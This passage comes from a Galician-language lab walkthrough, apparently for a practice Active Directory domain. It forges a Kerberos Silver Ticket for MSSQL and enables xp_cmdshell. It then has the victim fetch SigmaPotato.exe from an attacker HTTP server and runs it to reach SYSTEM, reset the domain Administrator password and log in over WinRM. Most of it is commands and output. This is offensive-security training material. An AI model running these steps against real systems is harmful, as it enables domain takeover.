+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>2025-12-10 10:03:58.174152 (+0000) -4381.436584 +/- 0.000433 192.168.56.100 s1 no-leap
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>CLOCK: time stepped by -4381.436584
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>Wed Dec 10 10:03:58 AM UTC 2025
+</span></code></pre></div>
+<hr />
+<h3 id="paso-4-forxado-do-silver-ticket">Paso 4: Forxado do Silver Ticket</h3>
+<p>Usamos <code>impacket-ticketer</code> para crear un ticket que diga "Son o Administrador" válido para o servizo MSSQL.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># Engadir entrada DNS (se non existe)</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;192.168.56.100 VULN-DC-01.vuln-he.lab VULN-HE.LAB&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">192</span>.168.56.100
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>impacket-ticketer<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">  </span>-nthash<span class="w"> </span>ad2896ecfb9b443720bab09bb020f852<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">  </span>-domain-sid<span class="w"> </span>S-1-5-21-1409906420-806768563-109815720<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">  </span>-domain<span class="w"> </span>VULN-HE.LAB<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">  </span>-spn<span class="w"> </span><span class="s2">&quot;MSSQLSvc/VULN-DC-01.vuln-he.lab:1433&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="w">  </span>Administrador
+</span></code></pre></div>
+<p><strong>Parámetros:</strong>  </p>
+<ul>
+<li><code>-nthash</code>: Hash NTLM de <code>svc_sql</code>  </li>
+<li><code>-domain-sid</code>: SID do dominio  </li>
+<li><code>-domain</code>: Nome DNS do dominio  </li>
+<li><code>-spn</code>: Service Principal Name exacto do servizo (debe coincidir EXACTAMENTE)  </li>
+<li><code>Administrador</code>: Usuario que queremos suplantar  </li>
+</ul>
+<p><strong>Resultado:</strong> Créase un ficheiro <code>Administrador.ccache</code>.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>[*] Creating basic skeleton ticket and PAC Infos
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>[*] Customizing ticket for VULN-HE.LAB/Administrador
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>[*] PAC_LOGON_INFO
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>[*] PAC_CLIENT_INFO_TYPE
+</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>[*] EncTicketPart
+</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>[*] EncTGSRepPart
+</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>[*] Signing/Encrypting final ticket
+</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>[*] Saving ticket in Administrador.ccache
+</span></code></pre></div>
+<hr />
+<h3 id="paso-5-verificacion-do-ticket">Paso 5: Verificación do Ticket</h3>
+<p><strong>Instalar ferramentas Kerberos:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>krb5-user
+</span></code></pre></div>
+<p>Comprobamos o contido do ticket obtido:</p>
+<p><strong>Inspeccionar o ticket:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>klist<span class="w"> </span>Administrador.ccache
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>Ticket cache: FILE:Administrador.ccache
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Default principal: Administrador@VULN-HE.LAB
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>Valid starting       Expires              Service principal
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>12/10/2025 10:12:41  12/08/2035 10:12:41  MSSQLSvc/VULN-DC-01.vuln-he.lab:1433@VULN-HE.LAB
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>        renew until 12/08/2035 10:12:41
+</span></code></pre></div>
+<blockquote>
+<p><strong>Validez de 10 anos!</strong> (2025 → 2035)</p>
+</blockquote>
+<hr />
+<h3 id="paso-6-uso-do-ticket-e-acceso-a-sql-server">Paso 6: Uso do Ticket e Acceso a SQL Server</h3>
+<p>Cargamos o ticket na variable de entorno e conectamos sen contrasinal.</p>
+<p><strong>Configurar entorno:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># Cargar o ticket</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrador.ccache
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c1"># Engadir entrada DNS (se non existe)</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="c1"># echo &#39;192.168.56.100 VULN-DC-01.vuln-he.lab VULN-HE.LAB&#39; | sudo tee -a /etc/hosts</span>
+</span></code></pre></div>
+<p><strong>Conectar a SQL Server:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">192</span>.168.56.100
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>impacket-mssqlclient<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="w">  </span>-k<span class="w"> </span>-no-pass<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="w">  </span>VULN-HE.LAB/Administrador@VULN-DC-01.vuln-he.lab
+</span></code></pre></div>
+<p><strong>Parámetros:</strong>  </p>
+<ul>
+<li><code>-k</code>: Usar autenticación Kerberos (o noso ticket falsificado)  </li>
+<li><code>-no-pass</code>: Non solicitar contrasinal  </li>
+</ul>
+<p><strong>Conexión exitosa:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>[*] Encryption required, switching to TLS
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>[*] INFO(VULN-DC-01\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>[!] Press help for extra shell commands
+</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>SQL (VULN-HE\Administrador  dbo@master)&gt; 
+</span></code></pre></div>
+<hr />
+<h3 id="paso-7-activacion-de-xp_cmdshell">Paso 7: Activación de xp_cmdshell</h3>
+<div class="admonition note">
+<p class="admonition-title"><strong>Dentro de MSSQL</strong></p>
+<p>Agora somos administradores da base de datos. Podemos activar <code>xp_cmdshell</code> para executar comandos no sistema operativo.</p>
+</div>
+<p><strong>Verificar usuario actual:</strong>  </p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">system_user</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>Resultado:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>---------------------   
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>VULN-HE\Administrador   
+</span></code></pre></div>
+<p><strong>Activar xp_cmdshell:</strong>  </p>
+<p>Método manual: 
+Método estándar e fiable. Este método sempre funciona (asumindo que tes permisos de <em>sysadmin</em>) porque utiliza os procedementos almacenados do sistema de SQL Server. </p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">reconfigure</span><span class="p">;</span>
+</span></code></pre></div>
+<details class="abstract">
+<summary>Método rápido</summary>
+<p>Só funciona se estás usando unha ferramenta, como <em>Impacket's mssqlclient.py</em>, que implemente o comando helper <code>enable_xp_cmdshell</code>, xa que NON é un comando nativo de SQL Server.<br />
+Ademais, <code>xp_cmdshell</code> está deshabilitado por defecto en SQL Server por razóns de seguridade, e necesitas permisos de <code>sysadmin</code> para habilitalo.</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">enable_xp_cmdshell</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="n">whoami</span>
+</span></code></pre></div>
+</details>
+<p><strong>Probar execución de comandos:</strong>  </p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;whoami&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>Saída:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>output            
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>---------------   
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>vuln-he\svc_sql   
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>NULL              
+</span></code></pre></div>
+<blockquote>
+<p><strong>Nota:</strong> Os comandos execútanse baixo o contexto de <code>svc_sql</code>, NON como Administrador. Se o servizo corre como <code>LocalSystem</code>, isto danos control total do servidor.</p>
+</blockquote>
+<hr />
+<h3 id="paso-8-comprobacion-de-privilexios">Paso 8: Comprobación de Privilexios</h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;whoami /priv&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>Privilexios relevantes detectados:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>Nombre de privilegio                      Descripción                                          Estado          
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>========================================= ==================================================== =============   
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>SeAssignPrimaryTokenPrivilege             Reemplazar un símbolo de nivel de proceso           Deshabilitado   
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>SeImpersonatePrivilege                    Suplantar a un cliente tras la autenticación        Habilitada      
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>SeManageVolumePrivilege                   Realizar tareas de mantenimiento del volumen        Habilitada      
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>SeCreateGlobalPrivilege                   Crear objetos globales                              Habilitada      
+</span></code></pre></div>
+<blockquote>
+<p><strong>SeImpersonatePrivilege está HABILITADO</strong> → Podemos realizar un ataque Potato</p>
+</blockquote>
+<hr />
+<h2 id="explotacion-seimpersonateprivilege-via-sql-server">Explotación: SeImpersonatePrivilege vía SQL Server</h2>
+<h3 id="descricion_1">Descrición</h3>
+<p>Agora xa podemos realizar o procedemento descrito no ficheiro <a href="../4-ATAQUE_ESPECIFICO_SEIMPERSONATE/" target="_blank">ATAQUE_SEIMPERSONATE</a>, pero <strong>adaptado ao novo escenario</strong>, onde:  </p>
+<ul>
+<li><strong>Non accedemos como <code>maria.g</code></strong>, senón como <strong><code>svc_sql</code> vía SQL Server (xp_cmdshell)</strong>  </li>
+<li>O ataque faise <strong>desde xp_cmdshell</strong>, non desde WinRM  </li>
+<li>O obxectivo é <strong>executar SigmaPotato en SYSTEM</strong> tal como fai o documento orixinal, pero adaptado a este contexto  </li>
+</ul>
+<p><strong>Fase aplicada:</strong> 4. Post-Explotación<br />
+<strong>Usuario inicial:</strong> <code>svc_sql</code> (a través de Silver Ticket → SQL Server → xp_cmdshell)<br />
+<strong>Obxectivo Final:</strong> <code>NT AUTHORITY\SYSTEM</code></p>
+<p>O servizo SQL Server executa o proceso MSSQL$SQLEXPRESS baixo a conta <code>svc_sql</code>, que posúe o privilexio <code>SeImpersonatePrivilege → HABILITADO</code>. Isto permite realizar un ataque <em>Potato</em> para elevar privilexios a <strong>SYSTEM</strong>.</p>
+<p>En lugar de tentar obter unha shell (ás veces inestable desde <code>xp_cmdshell</code>), utilizamos <strong>SigmaPotato</strong> para lanzar un comando directamente como SYSTEM.</p>
+<hr />
+<h3 id="paso-9-descarga-de-sigmapotato">Paso 9: Descarga de SigmaPotato</h3>
+<p><strong>Na máquina atacante:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>wget<span class="w"> </span>https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div>
+<p><strong>Na máquina vítima (vía xp_cmdshell):</strong>  </p>
+<p><strong>Crear directorio temporal:</strong>  </p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;mkdir C:\Temp&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>Descargar SigmaPotato:</strong>  </p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;powershell -command &quot;Invoke-WebRequest -Uri http://192.168.56.113/SigmaPotato.exe -OutFile C:\Temp\sp.exe&quot;&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>Verificar descarga:</strong>  </p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;dir C:\Temp&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="paso-10-execucion-do-ataque-obtencion-de-system">Paso 10: Execución do Ataque (obtención de SYSTEM)</h3>
+<p>Igual que no documento orixinal, lanzamos un comando arbitrario <strong>como SYSTEM</strong>, por exemplo, cambiar o contrasinal do Administrador:</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="k">SQL</span><span class="o">&gt;</span><span class="w"> </span><span class="k">exec</span><span class="w"> </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;C:\Temp\sp.exe &quot;net user Administrador 123456789&quot;&#39;</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>  </p>
+<p>SigmaPotato indica que conseguiu token SYSTEM e o comando execútase correctamente baixo SYSTEM:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>output
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>---------------------------------------------------------
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>[+] Starting Pipe Server...
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>[+] Pipe Connected!
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>[+] Impersonated Client: NT AUTHORITY\Servicio de red
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>[+] Searching for System Token...
+</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a>[+] PID: 852 | Token: 0x816 | User: NT AUTHORITY\SYSTEM
+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>[+] Found System Token: True
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>[+] Duplicating Token...
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a>[+] New Token Handle: 832
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>[+] Current Command Length: 32 characters
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>[+] Creating Process via &#39;CreateProcessAsUserW&#39;
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a>[+] Process Started with PID: 3068
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>NULL
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>[+] Process Output:
+</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a>Se ha completado el comando correctamente.
+</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>NULL
+</span><span id="__span-36-19"><a id="__codelineno-36-19" name="__codelineno-36-19" href="#__codelineno-36-19"></a>NULL
+</span><span id="__span-36-20"><a id="__codelineno-36-20" name="__codelineno-36-20" href="#__codelineno-36-20"></a>NULL
+</span></code></pre></div>
+<blockquote>
+<p><strong>O comando executouse correctamente como NT AUTHORITY\SYSTEM</strong></p>
+</blockquote>
+<hr />
+<h3 id="paso-11-verificacion-acceso-como-administrador">Paso 11: Verificación - Acceso como Administrador</h3>
+<p>Despois do cambio:</p>
+<p><strong>Conectar vía WinRM co novo contrasinal:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">192</span>.168.56.100<span class="w"> </span>-u<span class="w"> </span>Administrador<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;123456789&#39;</span>
+</span></code></pre></div>
+<p>Unha vez dentro:</p>
+<p><strong>Verificar identidade:</strong>  </p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrador</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="n">vuln-he</span><span class="p">\</span><span class="n">administrador</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrador</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="s2">&quot;S-1-5-32-544&quot;</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="n">VULN-HE</span><span class="p">\</span><span class="n">Administradores</span> <span class="nb">del </span><span class="n">dominio</span>
+</span></code></pre></div>
+<p>Debe indicar:  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>vuln-he\administrador
+</span></code></pre></div>
+<blockquote>
+<p><strong>Control total do dominio conseguido!</strong></p>
+</blockquote>
+<hr />
+<h2 id="resumo_1">Resumo</h2>
+<h3 id="duracion-e-validez-do-ticket">Duración e Validez do Ticket</h3>
+<p>Un <strong>Silver Ticket</strong>:<br />
+1. É un <em>TGS falsificado</em> para un servizo concreto (por exemplo: <code>MSSQLSvc/DC:1433</code>), que permite acceso persistente limitado exclusivamente a ese servizo durante anos.<br />
+2. Só depende do <strong>hash NTLM da conta de servizo</strong> (ex.: <code>svc_sql</code>) e non require contactar co KDC.  </p>
+<p><strong>Puntos clave:</strong>  </p>
+<ul>
+<li><strong>Validez por defecto:</strong> 10 anos (2025 → 2035)  </li>
+<li>O ticket xerado con <code>impacket-ticketer</code> ten, por defecto, <strong>validez de 10 anos</strong>  </li>
+<li>SQL Server <strong>non comproba o ticket co KDC</strong>, só verifica a firma baseada no NTLM da conta de servizo  </li>
+<li><strong>Verificación:</strong> SQL Server NON comproba o ticket co KDC, só verifica a firma baseada no hash NTLM de <code>svc_sql</code>  </li>
+</ul>
+<h3 id="o-ticket-permanece-valido-se">O Ticket Permanece Válido Se:</h3>
+<ul>
+<li>Se o hash de <code>svc_sql</code> non cambia, o ticket seguirá sendo válido durante toda a súa vida útil  </li>
+<li>O SPN do servizo (<code>MSSQLSvc/...</code>) non se modifica  </li>
+<li>O usuario finxido polo Silver Ticket <strong>existe dentro de SQL</strong> como login válido  </li>
+<li>O <strong>SPN</strong> coincide (<code>MSSQLSvc/NOME:1433</code>)  </li>
+</ul>
+<h3 id="o-ticket-invalidase-se">O Ticket Inválídase Se:</h3>
+<ul>
+<li>Se cambia o contrasinal de <code>svc_sql</code> (→ cambia o NTLM hash)  </li>
+<li>Elimínase ou modifícase o SPN asociado ao servizo  </li>
+<li>Desactívase ou elimínase o usuario suplantado  </li>
+</ul>
+<h3 id="conseguimos">Conseguimos:</h3>
+<ul>
+<li>Silver Ticket → acceso a SQL  </li>
+<li>xp_cmdshell → execución remota como <code>svc_sql</code>  </li>
+<li>SigmaPotato → <strong>SYSTEM directo</strong>  </li>
+<li>WinRM como Administrador → <strong>Control total do dominio</strong>  </li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Paso</th>
+<th>Acción</th>
+<th>Resultado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Obtención do hash NTLM de <code>svc_sql</code></td>
+<td><code>ad2896ecfb9b443720bab09bb020f852</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Obtención do SID do dominio</td>
+<td><code>S-1-5-21-1409906420-806768563-109815720</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Sincronización temporal (Clock Skew)</td>
+<td>Diferenza &lt; 5 minutos</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Forxado de Silver Ticket</td>
+<td><code>Administrador.ccache</code> (válido 10 anos)</td>
+</tr>
